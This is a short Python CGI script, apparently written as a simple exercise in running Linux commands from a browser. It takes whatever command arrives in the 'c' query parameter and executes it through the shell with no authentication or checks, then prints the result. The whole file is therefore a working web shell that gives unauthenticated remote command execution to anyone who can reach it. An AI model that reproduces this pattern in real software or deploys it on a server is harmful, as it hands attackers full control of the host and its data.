#!/usr/bin/python3

print("content-type: text/html")
print()

import subprocess
import cgi

#CGi for commands in Linux
form = cgi.FieldStorage()
cmd = form.getvalue("c")

#Output for commnads in linux
output = subprocess.getstatusoutput(cmd)
status = output[0]
out = output[1]


#If, Else for commands
if status == 0:
    print(out)
else:
    print("Error in the code, \n")
    print("Try using with the fist word in lower case")

